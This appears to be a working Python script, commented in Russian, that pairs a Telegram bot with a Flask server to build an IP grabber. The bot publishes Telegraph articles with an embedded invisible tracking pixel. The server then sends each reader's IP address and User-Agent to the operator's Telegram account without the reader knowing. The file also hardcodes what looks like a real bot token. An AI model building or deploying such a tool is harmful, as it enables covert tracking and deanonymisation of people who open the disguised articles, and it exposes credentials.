import io
import asyncio
from flask import Flask, request, send_file
from telegraph import Telegraph
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from threading import Thread

# --- НАСТРОЙКИ ---
BOT_TOKEN = "8594559077:AAFoKX-w7hpYDXkbHc3kTEcesO4vb5fW-nw"
YOUR_DOMAIN = "https://molecular-marnie-telepuziki-6932c5c9.koyeb.app" # Обязательно HTTPS
MY_ID = 7462192673  # Твой ID (чтобы бот знал кому слать логи)

app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
tg = Telegraph()
tg.create_account(short_name='News-Bot')

# --- ЧАСТЬ 1: ЛОГГЕР (FLASK) ---

@app.route('/log/<log_id>.png')
def logger(log_id):
    # Достаем IP и данные
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent')
    
    # Отправляем уведомление в Телеграм через фоновую задачу
    asyncio.run_coroutine_threadsafe(
        bot.send_message(MY_ID, f"🔔 **ПЕРЕХОД!**\n\n📍 IP: `{ip}`\n📱 UA: `{ua}`\n🔗 Метка: `{log_id}`"),
        loop
    )

    # Отдаем невидимый пиксель
    pixel = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
    return send_file(io.BytesIO(pixel), mimetype='image/png')

# --- ЧАСТЬ 2: БОТ (AIOGRAM) ---

@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer("Пришли заголовок и текст для статьи через черточку.\nПример: `Заголовок | Текст статьи` ")

@dp.message()
async def create_link(message: types.Message):
    if "|" not in message.text:
        return await message.answer("Используй формат: Заголовок | Текст")
    
    title, text = message.text.split("|", 1)
    log_id = message.message_id # Уникальная метка для ссылки
    
    # Создаем страницу
    content = [
        {"tag": "p", "children": [text.strip()]},
        {"tag": "img", "attrs": {"src": f"{YOUR_DOMAIN}/log/{log_id}.png"}}
    ]
    
    response = tg.create_page(title=title.strip(), content=content)
    await message.answer(f"✅ Статья создана!\n{response['url']}")

# --- ЗАПУСК ---

def run_flask():
    app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Запускаем Flask в отдельном потоке
    Thread(target=run_flask, daemon=True).start()
    
    # Запускаем бота
    print("Бот запущен...")
    loop.run_until_complete(dp.start_polling(bot))
